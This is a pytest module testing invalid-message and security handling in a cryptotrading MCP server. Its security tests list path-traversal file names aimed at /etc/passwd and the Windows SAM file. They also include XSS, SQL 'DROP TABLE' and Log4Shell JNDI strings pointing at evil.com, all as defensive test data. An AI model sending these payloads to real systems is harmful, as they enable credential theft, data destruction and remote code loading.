"""
Test invalid message handling in MCP implementation.

This module tests the system's validation and error handling for invalid messages:
- Schema validation failures
- Type mismatches in parameters
- Protocol version mismatches
- Invalid JSON-RPC structure
- Parameter validation
- Security validation
"""

import pytest
import asyncio
import json
from unittest.mock import Mock, AsyncMock
import sys
import os
from typing import Dict, Any

# Add project to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../src'))

from cryptotrading.core.protocols.mcp.protocol import (
    MCPProtocol, MCPRequest, MCPResponse, MCPError, MCPErrorCode
)
from cryptotrading.core.protocols.mcp.server import MCPServer
from cryptotrading.core.protocols.mcp.client import MCPClient
from cryptotrading.core.protocols.mcp.validation import ParameterValidator
from cryptotrading.core.protocols.mcp.tools import MCPTool


class TestJSONRPCValidation:
    """Test JSON-RPC protocol validation."""
    
    def test_invalid_jsonrpc_version(self):
        """Test handling of invalid JSON-RPC versions."""
        protocol = MCPProtocol()
        
        invalid_versions = [
            '{"jsonrpc": "1.0", "method": "test", "id": 1}',
            '{"jsonrpc": "3.0", "method": "test", "id": 1}',
            '{"jsonrpc": 2.0, "method": "test", "id": 1}',  # Number instead of string
            '{"jsonrpc": null, "method": "test", "id": 1}',
            '{"method": "test", "id": 1}',  # Missing jsonrpc
        ]
        
        for invalid_msg in invalid_versions:
            result = protocol.parse_message(invalid_msg)
            assert isinstance(result, MCPError)
            assert result.code == MCPErrorCode.INVALID_REQUEST.value
    
    def test_invalid_request_structure(self):
        """Test validation of request structure."""
        protocol = MCPProtocol()
        
        invalid_requests = [
            '{"jsonrpc": "2.0"}',  # Missing method
            '{"jsonrpc": "2.0", "method": null}',  # Null method
            '{"jsonrpc": "2.0", "method": 123}',  # Non-string method
            '{"jsonrpc": "2.0", "method": ""}',  # Empty method
            '{"jsonrpc": "2.0", "method": "test", "params": "invalid"}',  # Params not object
            '{"jsonrpc": "2.0", "method": "test", "id": {}}',  # Invalid ID type
        ]
        
        for invalid_msg in invalid_requests:
            result = protocol.parse_message(invalid_msg)
            if isinstance(result, MCPRequest):
                # Some may parse but be invalid
                if result.method == "" or result.method is None:
                    assert False, f"Should have failed validation: {invalid_msg}"
            else:
                assert isinstance(result, MCPError)
    
    def test_invalid_response_structure(self):
        """Test validation of response structure."""
        protocol = MCPProtocol()
        
        invalid_responses = [
            '{"jsonrpc": "2.0", "id": 1}',  # Missing result/error
            '{"jsonrpc": "2.0", "result": "test", "error": {}, "id": 1}',  # Both result and error
            '{"jsonrpc": "2.0", "error": "invalid", "id": 1}',  # Error not object
            '{"jsonrpc": "2.0", "error": {"message": "test"}, "id": 1}',  # Missing error code
            '{"jsonrpc": "2.0", "error": {"code": "invalid", "message": "test"}, "id": 1}',  # Non-numeric code
        ]
        
        for invalid_msg in invalid_responses:
            result = protocol.parse_message(invalid_msg)
            # Should either be error or invalid response
            if isinstance(result, MCPResponse):
                # Check for structural issues
                if result.result is not None and result.error is not None:
                    assert False, f"Response has both result and error: {invalid_msg}"


class TestParameterValidation:
    """Test parameter validation for tools and methods."""
    
    @pytest.mark.asyncio
    async def test_tool_parameter_type_validation(self):
        """Test tool parameter type validation."""
        mock_transport = AsyncMock()
        server = MCPServer("test-server", "1.0.0", mock_transport)
        
        # Tool that expects specific types
        def typed_tool(name: str, age: int, active: bool, scores: list):
            return {
                "name": name,
                "age": age,
                "active": active,
                "scores": scores
            }
        
        tool = MCPTool(
            name="typed_tool",
            description="Tool with strict types",
            parameters={
                "name": {"type": "string"},
                "age": {"type": "integer"},
                "active": {"type": "boolean"},
                "scores": {"type": "array", "items": {"type": "number"}}
            },
            function=typed_tool
        )
        server.add_tool(tool)
        
        # Test with wrong types
        invalid_calls = [
            {"name": 123, "age": 25, "active": True, "scores": [1, 2, 3]},  # name not string
            {"name": "John", "age": "25", "active": True, "scores": [1, 2, 3]},  # age not int
            {"name": "John", "age": 25, "active": "yes", "scores": [1, 2, 3]},  # active not bool
            {"name": "John", "age": 25, "active": True, "scores": "invalid"},  # scores not array
            {"name": "John", "age": 25, "active": True, "scores": [1, "two", 3]},  # array item wrong type
        ]
        
        for invalid_args in invalid_calls:
            result = await server._handle_call_tool({
                "name": "typed_tool",
                "arguments": invalid_args
            })
            # Should handle gracefully (may succeed with type coercion or fail)
            assert "isError" in result
    
    @pytest.mark.asyncio
    async def test_missing_required_parameters(self):
        """Test handling of missing required parameters."""
        mock_transport = AsyncMock()
        server = MCPServer("test-server", "1.0.0", mock_transport)
        
        def required_params_tool(required_param: str, optional_param: str = "default"):
            return f"{required_param}:{optional_param}"
        
        tool = MCPTool(
            name="required_params",
            description="Tool with required params",
            parameters={
                "required_param": {"type": "string"},
                "optional_param": {"type": "string", "default": "default"}
            },
            function=required_params_tool
        )
        server.add_tool(tool)
        
        # Test missing required parameter
        result = await server._handle_call_tool({
            "name": "required_params",
            "arguments": {"optional_param": "provided"}
        })
        
        # Should fail or handle gracefully
        assert "isError" in result
    
    def test_parameter_schema_validation(self):
        """Test parameter schema validation."""
        validator = ParameterValidator()
        
        # Valid schema
        schema = {
            "type": "object",
            "properties": {
                "name": {"type": "string"},
                "age": {"type": "integer", "minimum": 0, "maximum": 150}
            },
            "required": ["name"]
        }
        
        # Valid parameters
        valid_params = {"name": "John", "age": 25}
        is_valid, errors = validator.validate_parameters(valid_params, schema)
        assert is_valid
        assert not errors
        
        # Invalid parameters
        invalid_test_cases = [
            ({"age": 25}, "Missing required name"),
            ({"name": 123}, "Name wrong type"),
            ({"name": "John", "age": -5}, "Age below minimum"),
            ({"name": "John", "age": 200}, "Age above maximum"),
            ({"name": "John", "age": "twenty"}, "Age wrong type"),
        ]
        
        for invalid_params, description in invalid_test_cases:
            is_valid, errors = validator.validate_parameters(invalid_params, schema)
            assert not is_valid, f"Should be invalid: {description}"
            assert errors, f"Should have errors: {description}"


class TestSecurityValidation:
    """Test security-related validation."""
    
    @pytest.mark.asyncio
    async def test_malicious_parameter_injection(self):
        """Test protection against malicious parameter injection."""
        mock_transport = AsyncMock()
        server = MCPServer("test-server", "1.0.0", mock_transport)
        
        # Tool that could be vulnerable to injection
        def file_reader(filename: str):
            # This would be dangerous if not validated
            if "../" in filename or filename.startswith("/"):
                raise ValueError("Path traversal attempt detected")
            return f"Reading {filename}"
        
        tool = MCPTool(
            name="file_reader",
            description="Read file (path traversal protected)",
            parameters={"filename": {"type": "string"}},
            function=file_reader
        )
        server.add_tool(tool)
        
        # Test malicious filenames
        malicious_filenames = [
            "../../../etc/passwd",
            "/etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "file:///etc/passwd",
            "../../secrets.txt"
        ]
        
        for filename in malicious_filenames:
            result = await server._handle_call_tool({
                "name": "file_reader",
                "arguments": {"filename": filename}
            })
            
            # Should detect and block malicious input
            assert result["isError"] is True
            assert "traversal" in result["content"][0]["text"].lower()
    
    @pytest.mark.asyncio
    async def test_resource_exhaustion_protection(self):
        """Test protection against resource exhaustion attacks."""
        mock_transport = AsyncMock()
        server = MCPServer("test-server", "1.0.0", mock_transport)
        
        # Tool that could exhaust resources
        def memory_allocator(size_mb: int):
            if size_mb > 100:  # Limit allocation
                raise ValueError("Size limit exceeded")
            # Simulate allocation
            return f"Allocated {size_mb}MB"
        
        tool = MCPTool(
            name="allocator",
            description="Memory allocator with limits",
            parameters={"size_mb": {"type": "integer"}},
            function=memory_allocator
        )
        server.add_tool(tool)
        
        # Test excessive allocation requests
        result = await server._handle_call_tool({
            "name": "allocator",
            "arguments": {"size_mb": 10000}
        })
        
        assert result["isError"] is True
        assert "limit" in result["content"][0]["text"].lower()
    
    def test_input_sanitization(self):
        """Test input sanitization for special characters."""
        protocol = MCPProtocol()
        
        # Test with potentially dangerous characters
        dangerous_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "${jndi:ldap://evil.com/exploit}",
            "\x00\x01\x02\x03",  # Control characters
            "A" * 10000,  # Very long string
        ]
        
        for dangerous_input in dangerous_inputs:
            request = protocol.create_request("test", {"input": dangerous_input})
            serialized = protocol.serialize_message(request)
            parsed = protocol.parse_message(serialized)
            
            # Should parse correctly but input should be preserved
            assert isinstance(parsed, MCPRequest)
            assert parsed.params["input"] == dangerous_input


class TestProtocolVersionCompatibility:
    """Test protocol version compatibility."""
    
    @pytest.mark.asyncio
    async def test_client_server_version_mismatch(self):
        """Test handling of client/server version mismatches."""
        mock_transport = AsyncMock()
        server = MCPServer("test-server", "1.0.0", mock_transport)
        
        # Mock server with different protocol version
        old_protocol = MCPProtocol()
        old_protocol.version = "2023-01-01"  # Older version
        server.protocol = old_protocol
        
        # Test initialize with version mismatch
        params = {
            "protocolVersion": "2024-11-05",  # Newer client version
            "clientInfo": {"name": "test-client"},
            "capabilities": {"experimental": {}, "roots": {}}
        }
        
        # Should handle gracefully (log warning but continue)
        result = await server._handle_initialize(params)
        
        # Should return server's version
        assert result["protocolVersion"] == "2023-01-01"
    
    def test_unsupported_methods(self):
        """Test handling of unsupported/unknown methods."""
        protocol = MCPProtocol()
        
        # Test unknown method
        request = MCPRequest(method="unknown/method", params={}, id="123")
        
        # Should create proper error response
        response = asyncio.run(protocol.handle_request(request))
        
        assert isinstance(response, MCPResponse)
        assert response.error is not None
        assert response.error.code == MCPErrorCode.METHOD_NOT_FOUND.value
        assert "unknown/method" in response.error.message


class TestDataTypeValidation:
    """Test validation of different data types."""
    
    def test_numeric_validation(self):
        """Test numeric type validation and edge cases."""
        validator = ParameterValidator()
        
        schema = {
            "type": "object",
            "properties": {
                "integer": {"type": "integer"},
                "number": {"type": "number"},
                "positive": {"type": "number", "minimum": 0},
                "range": {"type": "integer", "minimum": 1, "maximum": 100}
            }
        }
        
        test_cases = [
            # Valid cases
            ({"integer": 42}, True),
            ({"number": 3.14}, True),
            ({"positive": 0}, True),
            ({"range": 50}, True),
            
            # Invalid cases
            ({"integer": 3.14}, False),  # Float for integer
            ({"integer": "42"}, False),  # String for integer
            ({"number": "not_a_number"}, False),  # Invalid number
            ({"positive": -1}, False),  # Negative for positive
            ({"range": 0}, False),  # Below minimum
            ({"range": 101}, False),  # Above maximum
            ({"integer": float('inf')}, False),  # Infinity
            ({"integer": float('nan')}, False),  # NaN
        ]
        
        for params, should_be_valid in test_cases:
            is_valid, errors = validator.validate_parameters(params, schema)
            if should_be_valid:
                assert is_valid, f"Should be valid: {params}"
            else:
                assert not is_valid, f"Should be invalid: {params}"
    
    def test_string_validation(self):
        """Test string validation with patterns and lengths."""
        validator = ParameterValidator()
        
        schema = {
            "type": "object",
            "properties": {
                "email": {
                    "type": "string",
                    "pattern": r"^[^@]+@[^@]+\.[^@]+$"
                },
                "short": {
                    "type": "string",
                    "maxLength": 10
                },
                "long": {
                    "type": "string",
                    "minLength": 5
                }
            }
        }
        
        test_cases = [
            # Valid cases
            ({"email": "test@example.com"}, True),
            ({"short": "hello"}, True),
            ({"long": "hello world"}, True),
            
            # Invalid cases
            ({"email": "not_an_email"}, False),
            ({"email": "@example.com"}, False),
            ({"short": "this_is_too_long"}, False),
            ({"long": "hi"}, False),
            ({"email": 123}, False),  # Wrong type
        ]
        
        for params, should_be_valid in test_cases:
            is_valid, errors = validator.validate_parameters(params, schema)
            if should_be_valid:
                assert is_valid, f"Should be valid: {params}"
            else:
                assert not is_valid, f"Should be invalid: {params}"
    
    def test_array_validation(self):
        """Test array validation with item constraints."""
        validator = ParameterValidator()
        
        schema = {
            "type": "object",
            "properties": {
                "numbers": {
                    "type": "array",
                    "items": {"type": "number"},
                    "minItems": 1,
                    "maxItems": 5
                },
                "mixed": {
                    "type": "array",
                    "items": [
                        {"type": "string"},
                        {"type": "number"}
                    ]
                }
            }
        }
        
        test_cases = [
            # Valid cases
            ({"numbers": [1, 2, 3]}, True),
            ({"mixed": ["hello", 42]}, True),
            
            # Invalid cases
            ({"numbers": []}, False),  # Too few items
            ({"numbers": [1, 2, 3, 4, 5, 6]}, False),  # Too many items
            ({"numbers": [1, "two", 3]}, False),  # Wrong item type
            ({"numbers": "not_an_array"}, False),  # Wrong type
            ({"mixed": [42, "hello"]}, False),  # Wrong order/types
        ]
        
        for params, should_be_valid in test_cases:
            is_valid, errors = validator.validate_parameters(params, schema)
            if should_be_valid:
                assert is_valid, f"Should be valid: {params}"
            else:
                assert not is_valid, f"Should be invalid: {params}"


class TestErrorMessageQuality:
    """Test quality and helpfulness of error messages."""
    
    def test_descriptive_error_messages(self):
        """Test that error messages are descriptive and helpful."""
        validator = ParameterValidator()
        
        schema = {
            "type": "object",
            "properties": {
                "name": {"type": "string"},
                "age": {"type": "integer", "minimum": 0, "maximum": 150}
            },
            "required": ["name"]
        }
        
        # Test various error scenarios
        test_cases = [
            ({"age": 25}, "name", "required"),  # Missing required field
            ({"name": 123}, "type", "string"),  # Wrong type
            ({"name": "John", "age": -5}, "minimum", "0"),  # Below minimum
            ({"name": "John", "age": 200}, "maximum", "150"),  # Above maximum
        ]
        
        for params, expected_keyword1, expected_keyword2 in test_cases:
            is_valid, errors = validator.validate_parameters(params, schema)
            assert not is_valid
            assert errors
            
            error_text = " ".join(errors).lower()
            assert expected_keyword1 in error_text
            assert expected_keyword2 in error_text
    
    @pytest.mark.asyncio
    async def test_helpful_tool_error_messages(self):
        """Test tool execution errors provide helpful context."""
        mock_transport = AsyncMock()
        server = MCPServer("test-server", "1.0.0", mock_transport)
        
        def division_tool(dividend: int, divisor: int):
            if divisor == 0:
                raise ValueError("Division by zero is not allowed")
            return dividend / divisor
        
        tool = MCPTool(
            name="division",
            description="Divide two numbers",
            parameters={
                "dividend": {"type": "integer"},
                "divisor": {"type": "integer"}
            },
            function=division_tool
        )
        server.add_tool(tool)
        
        # Test division by zero
        result = await server._handle_call_tool({
            "name": "division",
            "arguments": {"dividend": 10, "divisor": 0}
        })
        
        assert result["isError"] is True
        error_text = result["content"][0]["text"]
        assert "division" in error_text.lower()
        assert "zero" in error_text.lower()


if __name__ == "__main__":
    pytest.main([__file__, "-v"])